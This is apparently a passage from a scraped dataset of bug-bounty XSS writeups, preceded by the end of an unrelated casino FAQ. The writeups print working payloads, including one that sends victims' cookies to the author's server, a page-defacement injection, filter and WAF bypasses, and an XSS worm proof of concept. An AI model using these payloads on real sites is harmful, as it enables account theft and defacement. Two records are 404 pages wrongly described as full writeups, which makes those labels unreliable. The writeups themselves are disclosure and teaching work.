Приват24, Qiwi, криптовалюты (Bitcoin, Ethereum) и мобильные платежи. Время зачисления депозита обычно мгновенное, а вывод средств может занять от 1 до 3 рабочих дней. Насколько безопасны игры в онлайн-казино? Безопасность обеспечивается лицензированием, шифрованием данных и честными системами генерации случайных чисел. Игрокам рекомендуется выбирать только лицензированные платформы. Какие бонусы можно получить в украинских онлайн-казино? Бонусы включают приветственные пакеты, бесплатные вращения, кешбэк и программы лояльности. Эти акционные предложения увеличивают шансы на выигрыш. Какие риски связаны с игрой в онлайн-казино? Основные риски — это финансовые потери, игровая зависимость и технические проблемы. Для минимизации рисков важно играть осознанно и придерживаться установленного бюджета. Можно ли играть в украинских казино на мобильных устройствах? Да, большинство онлайн-казино предлагают мобильные приложения или адаптированные версии сайта, что позволяет играть в любое время и в любом месте. Как быстро проходят финансовые транзакции в казино? Депозиты обычно зачисляются мгновенно, а вывод средств может занимать от нескольких часов до 3 рабочих дней в зависимости от метода платежа. Как проверить легальность онлайн-казино в Украине? Убедитесь, что казино имеет лицензию от КРАИЛ (Комиссии по регулированию азартных игр и лотерей). Информация о лицензии должна быть указана на официальном сайте казино. Какие ошибки новички допускают при игре в онлайн-казино? Частые ошибки — игнорирование лицензии, ставка больше установленного бюджета, отсутствие стратегии и эмоциональные решения. Избегайте этих ошибок для улучшения игрового опыта. Copyright © 2025 - all rights reserved by mohamedharon.com Прокрутка вверх"}
{"source_url": "https://medium.com/@agrawalsmart7/cookie-based-injection-xss-making-exploitable-with-out-exploiting-other-vulns-81132ca01d67", "title": "Cookie-based-injection XSS making exploitable with-out exploiting other Vulns. | by Utkarsh Agrawal | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@agrawalsmart7/cookie-based-injection-xss-making-exploitable-with-out-exploiting-other-vulns-81132ca01d67. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nCookie-based-injection XSS making exploitable with-out exploiting other Vulns. | by Utkarsh Agrawal | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Utkarsh Agrawal 2 min read · Oct 22, 2018 -- Listen Share Cookie-based-injection XSS making exploitable with-out exploiting other Vulns. Hi all, This is a short blog post about making exploitable Cookie based XSS. I was testing a site [redacted.com] can’t take name for Obvious reasons. I was testing it on the Repeater tab on the burp and testing a parameter which was reflecting back on the HTML page but encoded. URL:- http:// [redacted.com] /path/file.php?f=a*&location =12 * was the injection point I was trying. <script type=\"text/javascript\"> page.perform('a*', 12); </script> I was trying to bypass the filter by injecting different payload again and again (means sending requests again and again) and all of the sudden I got another parameter reflected on the page which was cookie parameter which was not reflected before. How? Frankly I don’t know ? <script type=\"text/javascript\"> page.perform('a*', 12, '&PHPSESSID=73uj42unj5vu6urg6v4aa8'); </script> I was literally surprised that How I got this new parameter reflected on the page and why not before. Okay go on, now I started to see if that cookie parameter can be injected or not and to my surprised it was inject-able. Now I got XSS injection point but the main thing is How Can I exploit it against users ? For making cookie based XSS injection exploitable you might need to exploit another vulnerability i.e. CRLF (because you can then try %0d%0aSet-Cookie). I tried to find out but didn’t get it. Next I got an idea what if I place that Cookie paramete r into the URL GET parameters like this:- http://[redacted.com]/path/file.php?f=a&location =12&PHPSESSID={payload} payload:- a’);document.location=” http://myserver/ \"%2bdocument.cookie;test('. and yeah it works the same. Wow! I got all the cookies on my server. I quickly reported it to the team. :) It was a good case for me. AND one thing I got to learn is that if you got cookie based injection then you should also check by replace the parameter from cookie header to URL parameter like when you do POST to GET to make easy exploitable. Thanks JavaScript Xss Attack HTML Bug Bounty Cookies -- -- Written by Utkarsh Agrawal 205 followers · 30 following No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@ariffadhlullah2310/xss-deface-with-html-and-how-to-convert-the-html-into-charcode-f0c62dd5ef3f", "title": "XSS WITH HTML AND HOW TO CONVERT THE HTML INTO CHARCODE() | by Arif-ITSEC111 | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@ariffadhlullah2310/xss-deface-with-html-and-how-to-convert-the-html-into-charcode-f0c62dd5ef3f. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nXSS WITH HTML AND HOW TO CONVERT THE HTML INTO CHARCODE() | by Arif-ITSEC111 | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in XSS WITH HTML AND HOW TO CONVERT THE HTML INTO CHARCODE() Arif-ITSEC111 3 min read · Oct 22, 2018 -- Share Hello, Back Again With Me This time i want to try to do some inject XSS with HTML full page script. It can be called with “injecting xss then it will shows your HTML Page” As usual, i do some check with this command input : <script>alert(‘test’)</script> If vuln, i try something different My Target : https://www.******.com/ 2nd Open this Page : Uncle Jim's Javascript Utilities: CharCode Translator javascript examples with source code jdstiles.com Third, i try to convert my deface HTML web lol do COPY all of my HTML script. Then open uncle jim’s page Paste into that part (zoom if you can’t see) : Press enter or click to view image in full size sebelah kiri charcodeat() Then click the charcodeat() button Press enter or click to view image in full size sebelah kanan charcodeat() After got the char result, i do Copy the charcode on my notepad Then i do add some script : <script>document.documentElement.innerHTML=(String.fromCharCode(*paste here your charcode*));<script> It will looks this <script> document.documentElement.innerHTML=(String.fromCharCode(60, 104, 116, 109, 108, 62, 32, 10, 60, 104, 101, 97, 100, 62, 32, 10, 60, 115, 99, 114, 105, 112, 116, 62, 32, 118, 97, 114, 32, 109, 101, 115, 115, 97, 103, 101, 61, 34, 84, 73, 77, 73, 84, 83, 69, 67, 45, 78, 88, 71, 71, 34, 59, 10, 47, 47, dst));</script> Then back to your target page, paste into search column then do ENTER TADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ….. Press enter or click to view image in full size injecting XSS full page That;s it Thank you timeline 20/10/2018 (Submit Report) 21/10/2018 (Mitigation Bug) 22/10/2018 (Bug Closed) -- -- Written by Arif-ITSEC111 130 followers · 7 following Not All My Finding Disclose Here. But Trust me, I found a lot more than you thought CISM,CEH,CHFI,CCNP,IBM Certified. No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/", "title": "Medium", "friendly_explanation": "This is a bug bounty writeup from https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nMedium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in PAGE NOT FOUND 404 Out of nothing, something. You can find (just about) anything on Medium — apparently even a page that doesn’t exist. Maybe these stories will take you somewhere new? Home How the #ILookLikeAnEngineer Ad Campaign Happened Ten Years Ago Michelle Glauser Aug 3, 2025 · 9 min read How the #ILookLikeAnEngineer Ad Campaign Happened Ten Years Ago Michelle Glauser Aug 3, 2025 · 9 min read Three Things I Learned Debating RFK Jr.’s Health Policies Dr. Jess Steier Aug 13, 2025 · 8 min read Three Things I Learned Debating RFK Jr.’s Health Policies Dr. Jess Steier Aug 13, 2025 · 8 min read Endurance Sonny Hallett Aug 12, 2025 · 9 min read Endurance Sonny Hallett Aug 12, 2025 · 9 min read It’s the (Theoretical) End of Web Publishing (and I Feel Fine) Will Leitch Aug 12, 2025 · 8 min read Member-only It’s the (Theoretical) End of Web Publishing (and I Feel Fine) Will Leitch Aug 12, 2025 · 8 min read Member-only"}
{"source_url": "https://medium.com/@m4shahab1/magic-xss-with-two-parameters-463559b03949", "title": "Magic XSS with two parameters. I recently worked on bug bounty… | by Mahmood Shahabi | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@m4shahab1/magic-xss-with-two-parameters-463559b03949. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nMagic XSS with two parameters. I recently worked on bug bounty… | by Mahmood Shahabi | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Magic XSS with two parameters Mahmood Shahabi 2 min read · Oct 12, 2018 -- Listen Share I recently worked on bug bounty program. one of in scope websites has used an iframe like below to set a cookie for visitors. <iframe src=“http://example.com/setcookie?key= name &value= value ”></iframe> The iframe use javascript to set cookie instead of Set-Cookie header. key parameter is name of cookie and value parameter is its value. the javascript code is written similar to this <html> <body> <script> if (' name ' != '') { if (window.location.indexOf('exmaple.com') != -1) { document.cookie = ' name ' + \"=\" + ' value ' + \";domain=example.com\"; } else { document.cookie = ' name ' + \"=\" + ' value '; } } </script> </body> </html> The code is suitable for XSS attack vector. So I tried to close string 'name' with adding single quote to parameter and inject own javascript code in page but at server side, single quotes are replaced with empty string. They think this work can stop XSS attack but there are alternative ways to closing the string. First way is add newline like this /?key=name%0a&value=value <html> <body> <script> if ('name ' != '') { if (window.location.indexOf('exmaple.com') != -1) { document.cookie = 'name ' + \"=\" + 'value' + \";domain=example.com\"; } else { document.cookie = 'name ' + \"=\" + 'value'; } } </script> </body> </html> Second way is escaping close single quote with backslash. /?key=name\\&value=value <html> <body> <script> if ('name\\' != '') { if (window.location.indexOf('exmaple.com') != -1) { document.cookie = 'name\\' + \"=\" + 'value' + \";domain=example.com\"; } else { document.cookie = 'name\\' + \"=\" + 'value'; } } </script> </body> </html> at line document.cookie = ' name\\' + \"=\" + 'value'; the string closed by starting single quote of second string. Now value of value parameter is parsed as code -not data. So I try to inject payload in value parameter like /?key=name\\&value=;alert(1);// <html> <body> <script> if ('name\\' != '') { if (window.location.indexOf('exmaple.com') != -1) { document.cookie = ' name\\' + \"=\" + ';alert(1);//' + \";domain=example.com\"; } else { document.cookie = ' name\\' + \"=\" + ';alert(1);//'; } } </script> </body> </html> There is still a problem. An error occur at if ('name\\' != '') { because of unclosed string and interpreter doesn’t execute alert(1) . So I try to use alternative way to pass error. The new payload use </script><script> and like this /?key=name%0a</script><script>alert(1);</script>&value=value but the request is blocked by WAF. Add newline is bypass WAF in a simple way. /?key=name%0a</script><script>alert(1);%0a</script>&value=value . Unfortunately, Google Chrome XSS Auditor detects and blocks last payload. Now the second parameter comes in. I split payload in two parameters and generate final payload that is working. /?key=name%0a</script></script>alert(&value=%2bdocument.cookie);%0a</script> Press enter or click to view image in full size alert(document.cookie) Note: you can find a simple server code that simulate this challenge here Note: I have seen Google Chrome XSS auditor bypass with two parameters many years ago that is used multiline comment /* */ and was patched but you can see it’s work with some changes (using <script> ) JavaScript Ctf Bug Bounty Xss Attack Hacking -- -- Written by Mahmood Shahabi 28 followers · 6 following Interseted in Cyber Security; Noob CTFer; Bug Hunter No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@tim.kent/xss-in-dynamics-365-25c800aac473", "title": "XSS in Dynamics 365. I recently tested an application hosted… | by Tim Kent | TSS - Trusted Security Services | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@tim.kent/xss-in-dynamics-365-25c800aac473. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nXSS in Dynamics 365. I recently tested an application hosted… | by Tim Kent | TSS - Trusted Security Services | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in TSS - Trusted Security Services · TSS is a leading cyber security company founded by former Australian Government security specialists. This blog is a way for TSS staff to contribute back to the security industry XSS in Dynamics 365 Tim Kent 2 min read · Nov 6, 2018 -- Listen Share I recently tested an application hosted within Microsoft’s Dynamics 365 online services platform. During the test I discovered a Cross-Site Scripting (XSS) vulnerability . Dynamics 365 is typically extended with customer code which can be a source of trouble, however the vulnerability discovered was in the Dynamics 365 product itself. After obtaining permission from the client, I worked with the Microsoft Security Response Center to fix the issue. Now that it has been patched (as of the 18th October 2018) I can disclose the details of this vulnerability: Within Dynamics 365, the “Personal Document Template: Information” page reflects the user’s name without encoding it properly, so if the field is injected with a JavaScript payload, it will be run unchecked. Press enter or click to view image in full size In the Dynamics 365 tenant being tested, I was able to change the First Name and Last Name values for the “Application User” (this appears to be separate to the Azure AD User, which was locked down). I set the First Name field to contain a JavaScript payload. No special tricks needed; the payload was simply “</script><script>alert(‘xss’)</script>”. The First Name and Last Name fields are used throughout the application and are usually encoded safely. However the “Personal Document Template: Information” page reflects these fields without encoding and runs the payload. With this payload set, a malicious user can create or update any template they have access to, and direct a victim to the template information page. When the owner and last modified fields are loaded into the victim’s browser, the payload is fired. As you can see, this was not a complicated attack in hindsight but it has the potential to have a large impact. It is also a good example of how assumptions should not be made about the code base being tested. If I had assumed the product code had been extensively tested and was secure, then this simple XSS injection would have been overlooked. The takeaway is to try and remember to sanitise and encode all inputs/outputs, regardless of what they are used for, and not to make assumptions but rely on empirical evidence as a penetration tester! Thanks to Microsoft for acting as a responsible vendor in accepting and patching this vulnerability in such a short period of time. Security Information Security Hacking Penetration Testing -- -- Published in TSS - Trusted Security Services 168 followers · Last published Apr 9, 2020 TSS is a leading cyber security company founded by former Australian Government security specialists. This blog is a way for TSS staff to contribute back to the security industry Written by Tim Kent 13 followers · 1 following No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://portswigger.net/blog/xss-in-hidden-input-fields", "title": "XSS in hidden input fields | PortSwigger Research", "friendly_explanation": "This is a bug bounty writeup from https://portswigger.net/blog/xss-in-hidden-input-fields. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nXSS in hidden input fields | PortSwigger Research Get the whitepaper, toolkits & remediation guides → http1mustdie.com Login Products Solutions Research Academy Support Company Customers About Blog Careers Legal Contact Resellers My account Customers About Blog Careers Legal Contact Resellers Burp Suite DAST The enterprise-enabled dynamic web vulnerability scanner. Burp Suite Professional The world's #1 web penetration testing toolkit. Burp Suite Community Edition The best manual tools to start web security testing. View all product editions Burp Scanner Burp Suite's web vulnerability scanner Attack surface visibility Improve security posture, prioritize manual testing, free up time. CI-driven scanning More proactive security - find and fix vulnerabilities earlier. Application security testing See how our software enables the world to secure the web. DevSecOps Catch critical bugs; ship more secure software, more quickly. Penetration testing Accelerate penetration testing - find more bugs, more quickly. Automated scanning Scale dynamic scanning. Reduce risk. Save time/money. Bug bounty hunting Level up your hacking and earn more bug bounties. Compliance Enhance security monitoring to comply with confidence. View all solutions Product comparison What's the difference between Pro and Enterprise Edition? Support Center Get help and advice from our experts on all things Burp. Documentation Tutorials and guides for Burp Suite. Get Started - Professional Get started with Burp Suite Professional. Get Started - Enterprise Get started with Burp Suite Enterprise Edition. User Forum Get your questions answered in the User Forum. Downloads Download the latest version of Burp Suite. Visit the Support Center Downloads Download the latest version of Burp Suite. Articles Overview Core Topics Black Hat XSS Request Smuggling Template Injection Top 10 Hacking Techniques Articles Meet the Researchers James Kettle Gareth Heyes Martin Doyhenard Zakhar Fedotkin Talks RSS XSS in hidden input fields Gareth Heyes Researcher @garethheyes Published: 16 November 2015 at 11:25 UTC Updated: 14 June 2019 at 12:03 UTC At PortSwigger, we regularly run pre-release builds of Burp Suite against an internal testbed of popular web applications to make sure it's behaving properly. Whilst doing this recently, Liam found a Cross-Site Scripting ( XSS ) vulnerability in [REDACTED], inside a hidden input element: <input type=\"hidden\" name=\"redacted\" value=\" default\" injection=\"xss\" /> XSS in hidden inputs is frequently very difficult to exploit because typical JavaScript events like onmouseover and onfocus can't be triggered due to the element being invisible. I decided to investigate further to see if it was possible to exploit this on a modern browser. I tried a bunch of stuff like autofocus, CSS tricks and other stuff. Eventually I thought about access keys and wondered if the onclick event would be called on the hidden input when it activated via an access key. It most certainly does on Firefox! This means we can execute an XSS payload inside a hidden attribute, provided you can persuade the victim into pressing the key combination. On Firefox Windows/Linux the key combination is ALT+SHIFT+X and on OS X it is CTRL+ALT+X. You can specify a different key combination using a different key in the access key attribute. Here is the vector: <input type=\"hidden\" accesskey=\"X\" onclick=\"alert(1)\"> This vector isn't ideal because it involves some user interaction, but it's vastly better than expression() which only works on IE<=9. Please note if your reflection is repeated then the key combination will fail. A workaround is to then inject another attribute that breaks the second reflection. e.g. \" accesskey=\"x\" onclick=\"alert(1)\" x=' Note: We've reported this vulnerability to the application's security team. However, they haven't responded in any way after 12 days and a couple of emails. We wanted to make people aware of this particular technique, but we won't be naming the vulnerable application concerned until a patch is available. This isn't the first time that Burp Scanner has unearthed a vulnerability in an extremely popular web application, and we doubt it will be the last. Update - Now works on Chrome and link/meta and any other elements This technique now works in Chrome! It also works in link elements that means previously unexploitable XSS bugs in link elements where you only control attributes can be exploited using this technique. For example you might have a link element with a rel attribute on canonical, if you inject the accesskey attribute with an onclick event then you have XSS. <link rel=\"canonical\" accesskey=\"X\" onclick=\"alert(1)\" /> Poc using link elements (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X) Visit our Web Security Academy to learn more about cross-site scripting (XSS) XSS Back to all articles Related Research Stealing HttpOnly cookies with the cookie sandwich technique 22 January 2025 Stealing HttpOnly cookies with the cookie sandwich technique Bypassing WAFs with the phantom $Version cookie 04 December 2024 Bypassing WAFs with the phantom $Version cookie Concealing payloads in URL credentials 23 October 2024 Concealing payloads in URL credentials Exploiting XSS in hidden inputs and meta tags 11 July 2023 Exploiting XSS in hidden inputs and meta tags Burp Suite Web vulnerability scanner Burp Suite Editions Release Notes Vulnerabilities Cross-site scripting (XSS) SQL injection Cross-site request forgery XML external entity injection Directory traversal Server-side request forgery Customers Organizations Testers Developers Company About Careers Contact Legal Privacy Notice Insights Web Security Academy Blog Research Follow us © 2025 PortSwigger Ltd."}
{"source_url": "https://labs.detectify.com/2018/10/19/xss-using-a-bug-in-safari-and-why-blacklists-are-stupid/", "title": "Page Not Found - Labs Detectify", "friendly_explanation": "This is a bug bounty writeup from https://labs.detectify.com/2018/10/19/xss-using-a-bug-in-safari-and-why-blacklists-are-stupid/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nPage Not Found - Labs Detectify Manage the growing attack surface Resources Visit detectify.com Start 2-week free trial Featured Crowdsource Community Ethical Hacking How to Security guidance Writeups Home / 404 Oops ! Looks like this page was abducted… Here’s a couple of other links you might find useful instead: Read our latest posts Apply to join Crowdsource Get started Start 2-week free trial Book a demo For customers API documentation Knowledge Base Detectify status page Crowdsource What is Crowdsource? Meet the community Hack with us How it works Join Crowdsource Hacker login Blogs Detectify Labs Detectify Blog Legal Terms of use Privacy policy Cookie Policy Compliance & Security Responsible disclosure Product Platform overview Surface Monitoring Application Scanning Custom Policies Integrations Customer login Solutions by use case Attack surface protection Prevent subdomain takeover Scaling organizations Resources All resources Case studies Webinars E-books & Whitepapers Videos Events Trending topics Attack surface management Common attack vectors Log4j help Company About us Careers Press & Media Contact Twitter Linkedin Pricing Platform pricing Solutions by industry Technology Consumer packaged goods Media & Gaming Public Sector Partner program Become a partner © 2025 Detectify | Go hack yourself"}
{"source_url": "https://blog.compass-security.com/2018/12/xss-worm-a-creative-use-of-web-application-vulnerability/", "title": "XSS worm – A creative use of web application vulnerability – Compass Security Blog", "friendly_explanation": "This is a bug bounty writeup from https://blog.compass-security.com/2018/12/xss-worm-a-creative-use-of-web-application-vulnerability/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nXSS worm – A creative use of web application vulnerability – Compass Security Blog Compass Security Blog Offensive Defense Home Archive Contact Newsletter Home Archive Contact Newsletter XSS worm – A creative use of web application vulnerability December 21, 2018 / Nicolas Heiniger / 0 Comments In my free time, I like to do some bug bounty hunting. For some reasons, I’ve been doing this almost exclusively for Swisscom. One of the reason is that the scope is very broad and I like to have this vast landscape full of possibilities. While preparing the talk we had at BlackAlps (https://www.blackalps.ch) with Florian, he mentioned that an ex-colleague, Alexandre, had done a cool PoC for an XSS exploitation in the webmail at https://webmail.bluewin.ch. By chance, I had been starting to work on this system as well (and found an authorization bypass regarding email attachments… but this is another story ;-) ). Curious as I am, I contacted Alexandre and he shared his PoC with me, all credits for the idea and the first version goes to him! The whole idea is to use an XSS that can be forwarded via email to turn it into a worm that can replicate itself and spread on the mailbox of numerous users. This was possible in his version of the PoC thanks to an XSS that would get activated when the recipient of an email would reply and email or forward it. I thought it was very cool, but could use some improvement and I looked for another XSS to remove most of the user interaction. I was lucky enough to find one. The XSS is triggered in the attachments, where one can use special characters like < and > that won’t be properly escaped in the filename of the attachments. This happens when reading an email, the HTTP request is as follows: POST /cp/applink/mail/ReadMessage HTTP/1.1 Host: rich-v01.bluewin.ch User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://rich-v01.bluewin.ch/cp/ps/main/richui/main_swisscom X-CP-Application: RichUI 3.3.5.3.4 X-Requested-With: XMLHttpRequest Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Content-Length: 143 Cookie: [CUT BY COMPASS] Connection: close folderPath=Drafts&accountName=rireoubli%40bluewin.ch&detailLevel=hba&attachmentLevel=apt&drf=json&messageId=8&u=1480032388&d=bluewin.ch&t=82d87 As can be seen in the response below, the angle brackets are not escaped but the double-quotes are. The filename is later included into the DOM without more escaping, allowing for XSS. [CUT BY COMPASS] \"attachments\": [ { [CUT BY COMPASS] \"attributes\":[ { \"size\": \"24820\" }, { \"fileName\": \"grumpycat<img src=x onerror=alert(1)>.jpg\" }, { \"downloadUrl\": \"/applink/mail/Downloader?dhid=attachmentDownloader&messageId=8&accountName=rireoubli%40bluewin.ch&folderPath=Drafts&contentDisposition=attachment&attachmentIndex=0&contentSeed=d1281&pct=22d51\" }, { \"contentType\": \"IMAGE/JPEG; name=\\\"grumpycat<img src=x onerror=alert(1)>.jpg\\\"\" }, { \"mimeType\": \"IMAGE/JPEG\" } ] } [CUT BY COMPASS] However, there were some limitations. After some tries,I turned to twitter and got the help I needed: Armed with this, I could send the first version of the worm using the webmail. This would simply load a further script on my server and I could then easily trigger and modify the worm: From here, it was easy to update the PoC and the code would now do the following upon opening the email: Open a first popup “Here we go!” Open a second popup to thank the user and confirm that he wants to run arbitrary JavaScript in his session If the user accepted, open a third popup asking if the user agrees to mine some crypto coin while executing the PoC If the user accepted, open the bitcoin miner Get a list of all contacts and count the ones that end with @bluewin.ch, display 4 of them to the user and ask if we can send the worm to one of them Ask for a confirmation that the user really wants to send the payload to this email Confirming that the email was sent correctly and quitting All of this involves a lot of user interaction, but it would have been trivial (and even easier) to do it without asking the permission and let the worm propagate automatically. Here is a small video of the code in action: XSS worm in action Timeline: End of October 2018: First XSS Worm PoC 01.11.2018: Found second XSS and reported to Swisscom 02.11.2018: PoC code updated and forwarded to Swisscom 27.11.2018: Fix applied and verified 21.12.2018: Publication of this blog post As a last note, it was a pleasure to collaborate with Alexandre and the Swisscom team again, not forgetting all the ones on Twitter that took some time to help as well. Thanks to everyone that read that far, have a safe and merry Christmas! Bug Bounty swisscom Web Security worm XSS Previous post Substitutable Message Service Next post Windows Forensics with Plaso Leave a Reply Cancel reply Your email address will not be published. Required fields are marked * Comment * Name * Email * Recent Posts xvulnhuntr Pwn2Own Ireland 2024 – Ubiquiti AI Bullet The Dark Side of Azure Identity & Access Management – 5 IAM & Entra ID Security Risks You Can’t Ignore LinkedIn for OSINT: tips and tricks Renovate – Keeping Your Updates Secure? Categories Categories Select Category APT (8) Authentication (17) Bug Bounty (6) Entra ID (3) Evasion (3) Event (34) Exploiting (18) Forensic (25) Hacking-Lab (18) Hardening (33) Incident Response (14) Industrial Control Systems (14) Information Leakage (7) Internet of Things (15) Job (2) Linux (8) Log Management (6) Machine Learning (3) Malware Detection (6) Mobile (10) Networking (17) OS X (1) Patch (6) Penetration Test (60) Red Teaming (15) Research (75) Reversing (13) Risk Assessment (10) Scam (1) Social Engineering (1) Standards (10) SuisseID (1) Talk (22) Tools (27) Training (19) Uncategorized (19) Vulnerability (46) Web Application (50) Web Server (13) Windows (31) Wireless (6) Write-up (26) Tags Active Directory Advanced Metering Infrastructure Advisory Android Application Security ASFWS ASP.NET Black Hat bloodhound Bypass cloud Conference CTF CVE Defcon DFIR Exchange Federations Hardening HTML https Insomni'hack less Linux Logging Microsoft ntlm phishing PoC Privilege Escalation Pwn2Own relay Research SAML SAML Raider Security SharePoint Social Engineering sudo sudoers TLS Vulnerability Web Security XSS XXE Compass Links Compass Website FileBox Hacking-Lab Impressum Legal RSS Feed © 2025 Compass Security Blog Up ↑"}
{"source_url": "https://www.vpnmentor.com/blog/dom-xss-bug-affecting-tinder-shopify-yelp/", "title": "DOM-XSS Bug Affecting Tinder, Shopify, Yelp, and More", "friendly_explanation": "This is a bug bounty writeup from https://www.vpnmentor.com/blog/dom-xss-bug-affecting-tinder-shopify-yelp/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nDOM-XSS Bug Affecting Tinder, Shopify, Yelp, and More We review vendors based on rigorous testing and research but also take into account your feedback and our affiliate commission with providers. Some providers are owned by our parent company. Learn more vpnMentor was established in 2014 to review VPN services and cover privacy-related stories. Today, our team of hundreds of cybersecurity researchers, writers, and editors continues to help readers fight for their online freedom in partnership with Kape Technologies PLC, which also owns the following products: Holiday.com, ExpressVPN, CyberGhost, and Private Internet Access which may be ranked and reviewed on this website. The reviews published on vpnMentor are believed to be accurate as of the date of each article, and written according to our strict reviewing standards that prioritize professional and honest examination of the reviewer, taking into account the technical capabilities and qualities of the product together with its commercial value for users. The rankings and reviews we publish may also take into consideration the common ownership mentioned above, and affiliate commissions we earn for purchases through links on our website. We do not review all VPN providers and information is believed to be accurate as of the date of each article. Search EN Dansk Deutsch Español Français Hrvatski Indonesia Italiano Magyar Nederlands Norsk Polski Português Română Suomi Svenska Tiếng Việt Türkçe Čeština Ελληνικά Русский Українська български ไทย 日本語 简体中文 한국어 עברית العربية Blog Best VPN Best VPN Overall Best VPNs for Torrents Best VPNs for Windows Best VPNs for Android Best VPNs for Mac Best VPNs for iOS Best VPNs for USA Tools VPNs Comparison Compare the best VPNs' speeds, security, pricing, and more Test The Great China Firewall Check if you can access your favorite websites in China Test If a Website Is Blocked in Russia Check if you can access your favorite websites in Russia WebRTC & IP Address Leak Test Tool Find out if your browser or VPN is leaking your IP address Bitcoin Rate Converter Convert Bitcoin or Satoshis into multiple currencies Password Meter Find out if your password is strong, weak, or compromised Secure Password Generator Generate strong passwords for all of your accounts What is my IP address? Discover your public IP address (IPv4 & IPv6) and more Search by Location Search Google or Bing as if you're in a different country TV Ratings Chart - View TV show's ratings breakdown Detailed rating charts for the most popular TV shows VPN Speed Test Comparison Compare VPN download and upload speeds, ping, and more Coupons ExpressVPN Coupons CyberGhost VPN Coupons Private Internet Access Coupons IPVanish VPN Coupons PrivateVPN Coupons Reviews ExpressVPN CyberGhost VPN Private Internet Access NordVPN Surfshark IPVanish VPN PrivateVPN All VPN Reviews 2025 Guides What is a VPN What's the Dark Web How to Hide Your IP 5/9/14 Eyes Alliance Explained How to Use a VPN How We Test VPNs News Blog DOM-XSS Bug Affecting Tinder, Shopify, Yelp, and More Advertising Disclosure vpnMentor was established in 2014 to review VPN services and cover privacy-related stories. Today, our team of hundreds of cybersecurity researchers, writers, and editors continues to help readers fight for their online freedom in partnership with Kape Technologies PLC, which also owns the following products: Holiday.com, ExpressVPN, CyberGhost, and Private Internet Access which may be ranked and reviewed on this website. The reviews published on vpnMentor are believed to be accurate as of the date of each article, and written according to our strict reviewing standards that prioritize professional and honest examination of the reviewer, taking into account the technical capabilities and qualities of the product together with its commercial value for users. The rankings and reviews we publish may also take into consideration the common ownership mentioned above, and affiliate commissions we earn for purchases through links on our website. We do not review all VPN providers and information is believed to be accurate as of the date of each article. DOM-XSS Bug Affecting Tinder, Shopify, Yelp, and More Kristina Perunicic Published on October 09, 2018 Former Managing Editor Table of Contents Details: So, how did this bug affect more than Tinder? Our team of security researchers was researching dating apps client-side security, and one of the main focus targets was Tinder. After initial reconnaissance steps were done, a Tinder domain with multiple client-side security issues was found - meaning hackers could have access to users' profiles and details. Immediately after finding these vulnerabilities, we contacted Tinder via their responsible disclosure program and started working with them. We learned that the vulnerable endpoint isn’t owned by Tinder, but by branch.io, an attribution platform used by many big corporations around the globe. The Tinder security team helped us get in touch with them, and accordingly, they’ve put out a timely patch. Upon further investigation, it was discovered that numerous prominent websites, such as Shopify, Yelp, Western Union, and Imgur, were inadvertently exposing the vulnerable endpoint in their code and domains. Consequently, there is a potential risk for up to 685 million users. While the flaw has already been fixed, if you have recently used Tinder or any of the other affected sites, we recommend checking to make sure your account hasn't been compromised. It's a good idea to change your password ASAP. Details: DOM-based XSS vulnerability, also known as “type-0 XSS” is a class of cross-site scripting vulnerability that appears within the DOM. It is a type of attack wherein the attack payload is executed as a result of modifying the DOM environment in the victim’s browser, more so in a dynamic environment. In DOM-based XSS, the HTML source code and response of the attack will be exactly the same. This means the malicious payload cannot be found in the response, making it extremely difficult for browser-built in XSS mitigation features like Chrome’s XSS Auditor to perform. Can you spot the vulnerabilities? The fact that the vulnerability is DPM based and branch.io still isn't using CSP made these vulnerabilities easy to exploit in any browser we like. This meant that by modifying redirect strategy to a specially crafted payload to manipulate the DOM. 1. DOM XSS For example, our initial finding was the endpoint https://go.tinder.com/amp-iframe-redirect was prone to multiple vulnerabilities (scheme_redirect & redirect_strategy GET parameters control the div content). redirect_strategy is “INJECTIONA” and scheme_redirect is “INJECTIONB” from the code above. This meant that by modifying redirect_strategy to a dom-xss payload, it was possible to execute client-side code in the context of a Tinder domain in any browser: https://go.tinder.com/amp-iframe-redirect?scheme_redirect=http://google.com&redirect_strategy=1)%7B%0Aalert(1)%3B// will render in the DOM as: if (1){ alert(1); // && \"INJECTIONA\") { var parser = document.createElement('a'); parser.href = \"INJECTIONA\"; var protocol = parser.protocol.toLowerCase(); 2. validateProtocol() and validate() Bypass Also notice how validateProtocol() uses indexOf to check the schemes - the indexOf() method returns the position of the first occurrence of a specified value in a string. This method returns -1 if the value to search for never occurs. However, it can be tricked by using javascript://%0aalert(0)//good.com/https:// -- both the validate functions can be bypassed because indexOf will find “https://“ var parser = 